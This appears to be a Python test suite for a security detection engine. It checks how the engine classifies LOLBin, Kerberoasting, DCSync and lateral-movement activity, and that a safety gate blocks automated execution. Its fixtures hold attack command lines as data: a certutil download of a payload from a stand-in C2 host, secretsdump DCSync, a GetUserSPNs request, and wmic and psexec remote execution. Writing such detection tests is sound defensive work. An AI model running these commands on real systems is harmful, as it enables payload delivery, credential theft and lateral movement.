"""Phase 6B: Extended Causal Rule Engine & Dual-Use Behavioral Library Verification Suite.

Tests all 10 Acceptance Gates (P6B-01 through P6B-10) with executable proof.
"""
from __future__ import annotations

import os
import shutil
import tempfile
import time
from typing import Any, Dict, List

from security_state.contracts import (
    AttackState,
    CapabilityStatus,
    CausalLevel,
    CausalMechanismType,
    EntityCategory,
    EntityRef,
    EpistemicStatus,
    StandardCapabilities,
)
from security_state.capability.engine import (
    CapabilityCategory,
    CapabilityContext,
    TrustedCapabilityAbuseEngine,
)
from security_state.causal.engine import CausalSecurityEngine
from security_state.hydration.case_hydrator import CaseSecurityStateHydrator
from security_state.persistence.repository import SecurityStateRepository
from security_state.reachability.engine import EnterpriseReachabilityEngine, ReachabilityStatus
from security_state.state_engine.engine import SecurityStateEngine
from v2.investigation.builder import build_investigation
from v2.investigation.shadow_hook import maybe_dispatch_security_state_shadow


def get_test_dir(name: str) -> str:
    temp_dir = os.path.join(tempfile.gettempdir(), "nivx_phase6b_tests", name)
    os.makedirs(temp_dir, exist_ok=True)
    return temp_dir


def clean_test_dir(path: str) -> None:
    if os.path.exists(path):
        try:
            shutil.rmtree(path)
        except Exception:
            pass


# ─── P6B-01: LOLBAS Contextual Discrimination ────────────────────────────────
def test_p6b_01_lolbas_contextual_discrimination():
    """Verify engine separates benign admin LOLBin usage from weaponized proxy execution."""
    engine = TrustedCapabilityAbuseEngine()
    admin_ref = EntityRef(category=EntityCategory.USER, entity_id="user-sysadmin", tenant_id="t-lolbas")
    attacker_ref = EntityRef(category=EntityCategory.USER, entity_id="user-guest", tenant_id="t-lolbas")

    # Case A: Benign Admin using certutil to verify local certificate
    ctx_benign = CapabilityContext(
        capability_name="certutil.exe",
        identity_ref=admin_ref,
        is_authorized_admin=True,
        source_ip_or_subnet="10.0.0.50",
        destination_ip_or_domain="local",
        timestamp="2026-09-04T10:00:00Z",
        is_within_business_hours=True,
        command_line="certutil.exe -verify C:\\certs\\corporate_root.cer",
        parent_process="cmd.exe",
        process_privilege_level="ADMIN",
    )
    eval_benign = engine.evaluate_capability("t-lolbas", ctx_benign, ["ev-cert-01"])
    assert eval_benign.status == CapabilityStatus.AUTHORIZED_USE, f"Expected AUTHORIZED_USE, got {eval_benign.status}"
    assert any("competing hypothesis: routine administrative" in r.lower() for r in eval_benign.reasons)

    # Case B: Weaponized certutil downloading and decoding a payload
    ctx_malicious = CapabilityContext(
        capability_name="certutil.exe",
        identity_ref=attacker_ref,
        is_authorized_admin=False,
        source_ip_or_subnet="192.168.1.100",
        destination_ip_or_domain="http://evil-c2.com",
        timestamp="2026-09-04T02:30:00Z",
        is_within_business_hours=False,
        command_line="certutil.exe -urlcache -split -f http://evil-c2.com/payload.b64 C:\\temp\\p.b64 && certutil -decode C:\\temp\\p.b64 C:\\temp\\p.exe",
        parent_process="powershell.exe",
        process_privilege_level="USER",
        has_inbound_tunnel_or_proxy=True,
    )
    eval_malicious = engine.evaluate_capability("t-lolbas", ctx_malicious, ["ev-cert-02"])
    assert eval_malicious.status == CapabilityStatus.CONFIRMED_ATTACK, f"Expected CONFIRMED_ATTACK, got {eval_malicious.status}"
    assert eval_malicious.confidence >= 0.85
    assert eval_malicious.reversal_action_recommendation == "endpoint.terminate_process"


# ─── P6B-02: Kerberoasting Deterministic Causal Chain ─────────────────────────
def test_p6b_02_kerberoasting_causal_chain():
    """Verify SPN discovery -> Kerberos TGS-REQ -> ticket export causal chain."""
    causal_engine = CausalSecurityEngine()
    events = [
        {
            "id": "ev-spn-01",
            "time_ms": 1000,
            "timestamp": "2026-09-04T01:00:00Z",
            "process_name": "powershell.exe",
            "pid": 4100,
            "command_line": "powershell.exe -ExecutionPolicy Bypass -Command GetUserSPNs.ps1 -Request",
            "is_authorized_admin": False,
        },
        {
            "id": "ev-tgs-02",
            "time_ms": 1050,
            "timestamp": "2026-09-04T01:00:01Z",
            "process_name": "lsass.exe",
            "ppid": 4100,
            "action": "ticket_extracted",
            "command_line": "Kerberos ticket extracted: MSSQLSvc/db01.corp:1433 hash=$krb5tgs$23$...",
        }
    ]

    graph = causal_engine.evaluate_causality("t-kerb", "CASE-KERB-01", events)
    assert len(graph.edges) >= 1
    tgs_edge = next((e for e in graph.edges if e.mechanism.mechanism_type == "KERBEROS_TGS_REQUEST"), None)
    assert tgs_edge is not None, "Expected KERBEROS_TGS_REQUEST mechanism edge"
    assert tgs_edge.causal_level == CausalLevel.SUPPORTED_CAUSALITY
    assert tgs_edge.confidence >= 0.90

    # Competing hypothesis evaluated and refuted
    assert len(tgs_edge.competing_hypotheses) >= 1
    hyp = tgs_edge.competing_hypotheses[0]
    assert hyp.status == "REFUTED"
    assert "ev-spn-01" in hyp.refuting_evidence_ids


# ─── P6B-03: DCSync Active Directory Replication Chain ───────────────────────
def test_p6b_03_dcsync_replication_chain():
    """Verify DRSUAPI replication RPC invocation from non-DC client establishes DCSync causal edge."""
    causal_engine = CausalSecurityEngine()
    events = [
        {
            "id": "ev-dcsync-req",
            "time_ms": 2000,
            "timestamp": "2026-09-04T02:00:00Z",
            "process_name": "secretsdump.py",
            "pid": 5200,
            "command_line": "python secretsdump.py corp.local/attacker:pass@10.0.0.1 -just-dc-ntlm",
            "protocol": "DRSUAPI",
            "is_domain_controller": False,
        },
        {
            "id": "ev-dcsync-dump",
            "time_ms": 2100,
            "timestamp": "2026-09-04T02:00:01Z",
            "process_name": "lsass.exe",
            "ppid": 5200,
            "action": "credential_dump",
            "command_line": "Replicating directory partition: Administrator:500:aad3b...:e19cc...",
        }
    ]

    graph = causal_engine.evaluate_causality("t-dcsync", "CASE-DCSYNC-01", events)
    dcsync_edge = next((e for e in graph.edges if e.mechanism.mechanism_type == "DIRECTORY_REPLICATION_RPC"), None)
    assert dcsync_edge is not None, "Expected DIRECTORY_REPLICATION_RPC mechanism edge"
    assert dcsync_edge.causal_level == CausalLevel.STRONG_CAUSAL_EVIDENCE
    assert dcsync_edge.confidence >= 0.95

    # Refuting evidence on legitimate DC replication hypothesis
    hyp = dcsync_edge.competing_hypotheses[0]
    assert hyp.hypothesis_id == "hyp-legit-dc-replication"
    assert hyp.status == "REFUTED"


# ─── P6B-04: Multi-Host Traversal Modeling (Zero IKG Duplication) ────────────
def test_p6b_04_multi_host_traversal_modeling():
    """Verify lateral movement to adjacent host references existing IKG nodes without graph duplication."""
    reachability_engine = EnterpriseReachabilityEngine()
    foothold = EntityRef(category=EntityCategory.DEVICE, entity_id="device::host-01", tenant_id="t-lateral")

    # Authoritative IKG representation containing host-01 and host-02
    ikg_nodes = [
        {"id": "device::host-01", "type": "device", "name": "Workstation 01 (Fin)"},
        {"id": "device::host-02", "type": "device", "name": "Admin Jumpbox 02"},
        {"id": "server-dc-01", "type": "server", "name": "Domain Controller dc-01"},
    ]

    # Reachability with active lateral capability
    matrix = reachability_engine.compute_reachability(
        tenant_id="t-lateral",
        case_id="CASE-LAT-01",
        footholds=[foothold],
        harvested_credentials=[],
        active_capabilities=["CAP_MULTI_HOST_TRAVERSAL", "CAP_LATERAL_MOVEMENT"],
        ikg_nodes=ikg_nodes,
    )

    # Verify host-02 path exists and is CURRENTLY_REACHABLE referencing exact IKG entity ID
    host2_path = next((p for p in matrix.paths if p.target_entity.entity_id == "device::host-02"), None)
    assert host2_path is not None, "Target host-02 must be reachable"
    assert host2_path.status == ReachabilityStatus.CURRENTLY_REACHABLE
    assert host2_path.hops[0].hop_type == "REMOTE_WMI_PROCESS_CALL"
    assert host2_path.target_entity.entity_id == "device::host-02"


# ─── P6B-05: Competing Hypotheses Rigorous Evaluation ────────────────────────
def test_p6b_05_competing_hypotheses_rigor():
    """Verify legitimate DC-to-DC replication is classified AUTHORIZED_USE and corrobates benign hypothesis."""
    causal_engine = CausalSecurityEngine()
    events = [
        {
            "id": "ev-dc2dc-req",
            "time_ms": 3000,
            "timestamp": "2026-09-04T03:00:00Z",
            "process_name": "ntdsutil.exe",
            "pid": 800,
            "command_line": "DRSGetNCChanges sync from dc-02 to dc-01",
            "protocol": "DRSUAPI",
            "is_domain_controller": True,  # Genuine DC machine account
        },
        {
            "id": "ev-dc2dc-ack",
            "time_ms": 3100,
            "timestamp": "2026-09-04T03:00:01Z",
            "process_name": "lsass.exe",
            "ppid": 800,
            "action": "directory_replication",
            "command_line": "Directory sync completed: 0 objects updated",
        }
    ]

    graph = causal_engine.evaluate_causality("t-dc", "CASE-DC-01", events)
    dcsync_edge = next((e for e in graph.edges if e.mechanism.mechanism_type == "DIRECTORY_REPLICATION_RPC"), None)
    assert dcsync_edge is not None
    assert dcsync_edge.causal_level == CausalLevel.POSSIBLE_CAUSALITY
    assert dcsync_edge.competing_hypotheses[0].status == "CORROBORATED"


# ─── P6B-06: 10-Term Formal Epistemic Separation Preserved ───────────────────
def test_p6b_06_epistemic_separation_preserved():
    """Verify all 10 epistemic statuses are valid enum values and never collapsed."""
    expected_terms = {
        "OBSERVED", "SUPPORTED", "DERIVED", "LIKELY", "POSSIBLE",
        "PROJECTED", "ASSUMED", "UNSUPPORTED", "CONTRADICTED", "DISPROVEN"
    }
    actual_terms = {e.value for e in EpistemicStatus}
    assert expected_terms == actual_terms, f"Epistemic vocabulary mismatch: {actual_terms ^ expected_terms}"

    # Verify state engine uses discrete enum instances
    state_engine = SecurityStateEngine()
    entity = EntityRef(category=EntityCategory.DEVICE, entity_id="dev-epistemic", tenant_id="t-epistemic")
    
    # State with derived facts
    state = state_engine.evaluate_entity_state(
        tenant_id="t-epistemic",
        entity_ref=entity,
        evidence_items=[{
            "id": "ev-01",
            "type": "process_start",
            "payload": {"command_line": "certutil -urlcache -split http://malicious.com/test.exe test.exe"},
        }]
    )
    assert isinstance(state.epistemic_status, EpistemicStatus)
    assert state.epistemic_status in (EpistemicStatus.DERIVED, EpistemicStatus.SUPPORTED)


# ─── P6B-07: Unbroken Evidence Provenance DAG ─────────────────────────────────
def test_p6b_07_evidence_provenance_unbroken():
    """Verify full DAG trace connecting conclusion -> attack state -> capability -> causal fact -> evidence IID."""
    test_dir = get_test_dir("p6b_07_dag")
    clean_test_dir(test_dir)
    try:
        repo = SecurityStateRepository(fallback_storage_dir=test_dir)
        hydrator = CaseSecurityStateHydrator(repository=repo)
        frames = [
            {
                "frame_iid": "frame-dcsync-101",
                "ts": "2026-09-04T04:00:00Z",
                "action": "directory_replication",
                "entity": {"iid": "proc-dcsync", "name": "secretsdump.py"},
                "cmdline": "secretsdump.py -just-dc-user Administrator corp.local/attacker:pass@10.0.0.1",
                "verdict": "malicious",
            }
        ]

        result = hydrator.hydrate_and_persist("CASE-DAG-01", "t-dag", frames)
        prov = result["provenance"]
        assert "nodes" in prov and "edges" in prov
        node_types = {n["node_type"] for n in prov["nodes"]}
        assert "CONCLUSION" in node_types
        assert "ATTACK_STATE" in node_types
        assert "CAPABILITY" in node_types
        assert "EVIDENCE" in node_types

        # Verify evidence node connects to raw frame IID
        ev_node = next((n for n in prov["nodes"] if n["node_type"] == "EVIDENCE"), None)
        assert ev_node is not None
        assert "frame-dcsync-101" in ev_node["node_id"]
        assert ev_node["epistemic_status"] == EpistemicStatus.OBSERVED.value
    finally:
        clean_test_dir(test_dir)


# ─── P6B-08: Authoritative Investigation Pipeline Invariance ──────────────────
def test_p6b_08_authoritative_pipeline_invariance():
    """Verify multi-host case through build_investigation() is 100% bit-identical with shadow enabled."""
    frames = [
        {
            "frame_iid": "frame-multi-01",
            "ts": "2026-09-04T05:00:00Z",
            "action": "process.start",
            "entity": {"iid": "proc-01", "name": "wmic.exe"},
            "cmdline": "wmic.exe /node:192.168.1.50 process call create 'cmd.exe /c certutil.exe -decode p.b64 p.exe'",
            "verdict": "malicious",
        }
    ]

    # Authoritative baseline
    inv_baseline = build_investigation(frames, case_id="CASE-P6B-INV")
    dict_baseline = inv_baseline.to_dict()

    # Shadow invocation
    inv_shadow = build_investigation(frames, case_id="CASE-P6B-INV")
    maybe_dispatch_security_state_shadow("CASE-P6B-INV", "t-inv", frames, inv_shadow.ikg, sync=True)
    dict_shadow = inv_shadow.to_dict()

    assert dict_baseline["header"]["verdict_band"] == dict_shadow["header"]["verdict_band"]
    assert dict_baseline["verdicts"] == dict_shadow["verdicts"]
    assert dict_baseline["story"] == dict_shadow["story"]
    assert dict_baseline["ikg"]["nodes"] == dict_shadow["ikg"]["nodes"]
    assert dict_baseline["ikg"]["edges"] == dict_shadow["ikg"]["edges"]


# ─── P6B-09: Execution Safety Gate Intact ─────────────────────────────────────
def test_p6b_09_execution_safety_gate_intact():
    """Verify EXECUTE remains locked even for critical Kerberoasting and DCSync detections."""
    from security_state.routers.router import stage_intervention_decision, StageInterventionRequest
    test_dir = get_test_dir("p6b_09_gate")
    clean_test_dir(test_dir)
    try:
        repo = SecurityStateRepository(fallback_storage_dir=test_dir)
        hydrator = CaseSecurityStateHydrator(repository=repo)
        frames = [
            {
                "frame_iid": "frame-dcsync-safe",
                "ts": "2026-09-04T04:00:00Z",
                "action": "directory_replication",
                "entity": {"iid": "proc-dcsync", "name": "secretsdump.py"},
                "cmdline": "secretsdump.py -just-dc-user Administrator corp.local/attacker:pass@10.0.0.1",
                "verdict": "malicious",
            }
        ]
        hydrator.hydrate_and_persist("CASE-SAFETY-01", "t-safety", frames)

        from security_state.routers import set_repository, get_repository
        old_repo = get_repository()
        set_repository(repo)
        try:
            req = StageInterventionRequest(
                tenant_id="t-safety",
                action_id="endpoint.isolate",
                target_entity_id="server-dc-01",
                status="EXECUTE",
            )
            res = stage_intervention_decision("CASE-SAFETY-01", req)
            assert res["success"] is False
            assert res["status"] == "ACTION_EXECUTION_BLOCKED"
            assert "SAFETY GATE" in res["error"]
        finally:
            set_repository(old_repo)
    finally:
        clean_test_dir(test_dir)


# ─── P6B-10: State Engine & Attack State Advancement ─────────────────────────
def test_p6b_10_state_and_attack_advancement():
    """Verify multi-host lateral traversal advances AttackState to LATERAL_MOVEMENT."""
    test_dir = get_test_dir("p6b_10_adv")
    clean_test_dir(test_dir)
    try:
        repo = SecurityStateRepository(fallback_storage_dir=test_dir)
        hydrator = CaseSecurityStateHydrator(repository=repo)
        frames = [
            {
                "frame_iid": "frame-lat-01",
                "ts": "2026-09-04T06:00:00Z",
                "action": "process.start",
                "entity": {"iid": "proc-psexec", "name": "psexec.exe"},
                "cmdline": "psexec.exe \\\\192.168.1.100 admin$ -u admin -p pass cmd.exe",
                "verdict": "malicious",
            }
        ]

        result = hydrator.hydrate_and_persist("CASE-ADV-01", "t-adv", frames)
        assert result["success"] is True
        assert result["attack_state"] == AttackState.LATERAL_MOVEMENT.value
        assert "CAP_MULTI_HOST_TRAVERSAL" in result["active_capabilities"]
    finally:
        clean_test_dir(test_dir)
